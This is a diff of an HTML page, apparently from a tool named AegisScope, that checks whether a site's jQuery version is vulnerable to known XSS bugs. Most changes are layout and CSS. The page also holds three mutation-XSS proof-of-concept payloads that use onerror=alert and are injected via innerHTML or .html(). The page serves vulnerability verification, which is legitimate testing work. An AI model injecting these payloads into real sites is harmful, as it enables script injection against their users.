@@ -5,26 +5,33 @@
     <meta name="resource-profile" content="flagqaz/AegisScope:99adf0bf9fce110c:38279b8e5561ab7b">
     <title>玄镜 AegisScope jQuery低版本漏洞验证</title>
     <style>
-        :root { color-scheme: dark; --line: #24485a; --soft: rgba(97,222,255,0.10); --green: #b9ffe9; --yellow: #ffe7ad; --red: #ffd2d2; }
+        :root { color-scheme: dark; --line: #24485a; --green: #b9ffe9; --yellow: #ffe7ad; --red: #ffd2d2; }
         * { box-sizing: border-box; }
         body { margin: 24px; font-family: Arial, "Microsoft YaHei", sans-serif; background: #07111b; color: #e8fbff; }
         h1 { margin: 0 0 8px; font-size: 24px; }
-        h2 { margin: 26px 0 10px; color: var(--green); font-size: 18px; }
+        h2 { margin: 18px 0 10px; color: var(--green); font-size: 18px; }
         button { margin: 4px 6px 10px 0; padding: 8px 12px; border: 1px solid #3c6f83; border-radius: 6px; background: #102233; color: #e8fbff; cursor: pointer; font-weight: 700; }
         button:hover { background: #19344a; }
         button.secondary { border-color: rgba(255,231,173,0.45); color: var(--yellow); }
-        xmp { padding: 12px; border: 1px solid #264759; border-radius: 6px; background: #02080f; color: #dffaff; white-space: pre-wrap; word-break: break-all; }
+        xmp { margin: 8px 0 16px; padding: 12px; border: 1px solid #264759; border-radius: 6px; background: #02080f; color: #dffaff; white-space: pre-wrap; word-break: break-all; }
         .notice { margin: 14px 0 18px; padding: 12px 14px; border: 1px solid rgba(255,140,140,0.45); border-radius: 6px; background: rgba(72,15,22,0.42); color: var(--red); line-height: 1.6; }
-        .meta, .panel { margin: 10px 0; padding: 12px; border: 1px solid var(--line); border-radius: 7px; background: #0b1725; color: #a9c3d1; }
+        .grid { display: grid; grid-template-columns: minmax(0, 1fr) minmax(280px, 0.35fr); gap: 12px; align-items: stretch; height: min(620px, 74vh); margin: 10px 0 18px; }
+        .left-stack { min-height: 0; display: grid; grid-template-rows: auto minmax(0, 1fr); gap: 12px; }
+        .meta, .panel, .poc-panel { padding: 12px; border: 1px solid var(--line); border-radius: 7px; background: #0b1725; color: #a9c3d1; }
         .meta code { color: var(--yellow); word-break: break-all; }
-        .grid { display: grid; grid-template-columns: minmax(0, 1fr) minmax(220px, 0.35fr); gap: 12px; }
         .manual-row { display: grid; grid-template-columns: 1fr auto; gap: 8px; margin-top: 10px; }
         .manual-row input { min-width: 0; padding: 8px 10px; border: 1px solid var(--line); border-radius: 6px; background: #02080f; color: #e8fbff; font: inherit; }
         .risk { display: inline-flex; align-items: center; min-height: 24px; padding: 3px 8px; border-radius: 999px; border: 1px solid rgba(255,231,173,0.32); background: rgba(255,231,173,0.12); color: var(--yellow); font-weight: 700; }
-        .candidate-list { display: grid; gap: 7px; margin-top: 8px; }
+        .panel { min-height: 0; overflow: hidden; display: flex; flex-direction: column; }
+        .poc-panel { min-height: 0; overflow: auto; }
+        .poc-panel h2:first-child { margin-top: 0; }
+        .candidate-list { display: grid; gap: 7px; margin-top: 8px; padding-right: 4px; overflow: auto; min-height: 0; }
         .candidate { display: grid; grid-template-columns: 1fr auto; gap: 8px; align-items: center; padding: 8px; border: 1px solid rgba(97,222,255,0.16); border-radius: 6px; background: rgba(3,11,20,0.44); }
         .candidate code { color: #dffaff; word-break: break-all; }
         .candidate small { color: #87a4b8; }
+        .candidate-progress { margin-top: 8px; color: #87a4b8; font-size: 12px; }
+        .candidate-progress b { display: block; height: 5px; margin-top: 6px; border-radius: 999px; background: rgba(97,222,255,0.12); overflow: hidden; }
+        .candidate-progress i { display: block; width: 0%; height: 100%; border-radius: inherit; background: linear-gradient(90deg, #b9ffe9, #61deff); transition: width .2s ease; }
         .hint { display: inline-block; margin-left: 8px; color: #87a4b8; font-size: 12px; }
         .hint.ok { color: var(--green); }
         .hint.warn { color: var(--yellow); }
@@ -34,6 +41,10 @@
         #div { margin-top: 18px; padding: 12px; min-height: 48px; border: 1px dashed #3c6f83; border-radius: 6px; }
         @media (max-width: 860px) {
             .grid, .manual-row, .candidate { grid-template-columns: 1fr; }
+            .grid { height: auto; }
+            .meta, .panel, .poc-panel { height: auto; max-height: none; }
+            .poc-panel { overflow: visible; }
+            .candidate-list { max-height: 320px; }
         }
     </style>
     <script src="../scripts/pages/jquery-vuln-check.js"></script>
@@ -47,43 +58,52 @@
 </div>
 
 <div class="grid">
-    <div class="meta">
-        <div>当前 jQuery 链接：<code id="targetJquerySrc">加载中...</code></div>
-        <div>嗅探到的版本：<code id="sniffedVersion">加载中...</code></div>
-        <div>实际加载版本：<code id="loadedVersion">未加载</code></div>
-        <div>加载状态：<code id="loadStatus">等待加载...</code></div>
-        <div style="margin-top:10px;">风险判断：<span id="riskLevel" class="risk">等待版本</span></div>
-        <div class="manual-row">
-            <input id="manualJquerySrc" type="text" placeholder="手动填写 jQuery 链接，留空则使用嗅探到的链接">
-            <button id="manualLoad" type="button">使用手动链接</button>
+    <div class="left-stack">
+        <div class="meta">
+            <div>当前 jQuery 链接：<code id="targetJquerySrc">加载中...</code></div>
+            <div>嗅探到的版本：<code id="sniffedVersion">加载中...</code></div>
+            <div>实际加载版本：<code id="loadedVersion">未加载</code></div>
+            <div>加载状态：<code id="loadStatus">等待加载...</code></div>
+            <div style="margin-top:10px;">风险判断：<span id="riskLevel" class="risk">等待版本</span></div>
+            <div class="manual-row">
+                <input id="manualJquerySrc" type="text" placeholder="手动填写 jQuery 链接，留空则使用嗅探到的链接">
+                <button id="manualLoad" type="button">使用手动链接</button>
+            </div>
+        </div>
+
+        <div class="poc-panel">
+            <h2>PoC 1 <span id="poc1Hint" class="hint">等待版本</span></h2>
+            <button data-poc="1" data-mode="inner">Assign to innerHTML</button>
+            <button data-poc="1" data-mode="jquery">Append via .html()</button>
+            <xmp id="poc1">
+<style><style /><img src=x onerror=alert('xss')>
+            </xmp>
+
+            <h2>PoC 2 <span id="poc2Hint" class="hint">等待版本</span></h2>
+            <button data-poc="2" data-mode="inner">Assign to innerHTML</button>
+            <button data-poc="2" data-mode="jquery">Append via .html()</button>
+            <xmp id="poc2">
+<img alt="<x" title="/><img src=x onerror=alert('xss')>">
+            </xmp>
+
+            <h2>PoC 3 <span id="poc3Hint" class="hint">等待版本</span></h2>
+            <button data-poc="3" data-mode="inner">Assign to innerHTML</button>
+            <button data-poc="3" data-mode="jquery">Append via .html()</button>
+            <xmp id="poc3">
+<option><style></option></select><img src=x onerror=alert('xss')></style>
+            </xmp>
         </div>
     </div>
+
     <div class="panel">
         <strong>候选核心库</strong>
+        <div id="candidateProgress" class="candidate-progress">
+            <span id="candidateProgressText">等待探测...</span>
+            <b><i id="candidateProgressBar"></i></b>
+        </div>
         <div id="candidateList" class="candidate-list"></div>
     </div>
 </div>
-
-<h2>PoC 1 <span id="poc1Hint" class="hint">等待版本</span></h2>
-<button data-poc="1" data-mode="inner">Assign to innerHTML</button>
-<button data-poc="1" data-mode="jquery">Append via .html()</button>
-<xmp id="poc1">
-<style><style /><img src=x onerror=alert('xss')>
-</xmp>
-
-<h2>PoC 2 <span id="poc2Hint" class="hint">等待版本</span></h2>
-<button data-poc="2" data-mode="inner">Assign to innerHTML</button>
-<button data-poc="2" data-mode="jquery">Append via .html()</button>
-<xmp id="poc2">
-<img alt="<x" title="/><img src=x onerror=alert('xss')>">
-</xmp>
-
-<h2>PoC 3 <span id="poc3Hint" class="hint">等待版本</span></h2>
-<button data-poc="3" data-mode="inner">Assign to innerHTML</button>
-<button data-poc="3" data-mode="jquery">Append via .html()</button>
-<xmp id="poc3">
-<option><style></option></select><img src=x onerror=alert('xss')></style>
-</xmp>
 
 <h2>验证记录</h2>
 <ol id="verifyLog"></ol>
